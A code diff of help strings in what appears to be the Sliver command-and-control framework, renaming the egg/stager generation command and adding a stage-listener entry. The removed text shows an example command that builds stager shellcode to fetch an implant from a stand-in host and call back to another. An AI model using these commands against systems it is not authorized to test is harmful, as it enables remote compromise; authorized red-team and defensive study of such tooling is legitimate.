@@ -39,7 +39,7 @@ var (
 		consts.GenerateStr:        generateHelp,
 		consts.NewProfileStr:      newProfileHelp,
 		consts.ProfileGenerateStr: generateProfileHelp,
-		consts.GenerateEggStr:     generateEggHelp,
+		consts.StagerStr:          generateStagerHelp,
 
 		consts.MsfStr:              msfHelp,
 		consts.MsfInjectStr:        msfInjectHelp,
@@ -135,26 +135,15 @@ Due to the large number of options and C2s this can be a lot of typing. If you'd
 see 'help new-profile'. All "generate" flags can be saved into a profile, you can view existing profiles with the "profiles"
 command.
 `
-	generateEggHelp = `[[.Bold]]Command:[[.Normal]] generate-egg <options>
-[[.Bold]]About:[[.Normal]] Generate a new sliver egg (stager) shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --output-format.
-
-[[.Bold]][[.Underline]]++ Stager listener ++[[.Normal]]
-You must specify a stager listener when generating an egg. This can be done with the --listener-url command, and looks like either one of these:
-
---listener-url tcp://1.2.3.4:4567
---listener-url http://1.2.3.4:2222
---listener-url https://1.2.3.4:4444
-
-[[.Bold]][[.Underline]]++ Command and Control ++[[.Normal]]
-You must specificy at least one c2 endpoint when generating an implant, this can be one or more of --mtls, --http, or --dns.
-The command requires at least one use of --mtls, --http, or --dns.
-
-The follow command is used to generate a sliver egg shellcode, that will retrieve a sliver shellcode on bob.example:4444 which will itself connect back to foo.example.com:
-	generate-egg --mtls foo.example.com --listener-url tcp://bob.example:4444
+	generateStagerHelp = `[[.Bold]]Command:[[.Normal]] generate stager <options>
+[[.Bold]]About:[[.Normal]] Generate a new sliver  stager shellcode and saves the output to the cwd or a path specified with --save, or to stdout using --output-format.
 
 [[.Bold]][[.Underline]]++ Output Formats ++[[.Normal]]
 You can use the --output-format flag to print out the shellcode to stdout, in one of the following transform formats:
 [[.Italic]]bash c csharp dw dword hex java js_be js_le num perl pl powershell ps1 py python raw rb ruby sh vbapplication vbscript[[.Normal]]
+`
+	stageListenerHelp = `[[.Bold]]Command:[[.Normal]] stage-listener <options>
+[[.Bold]]About:[[.Normal]] Starts a stager listener bound to a Sliver profile.
 `
 
 	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
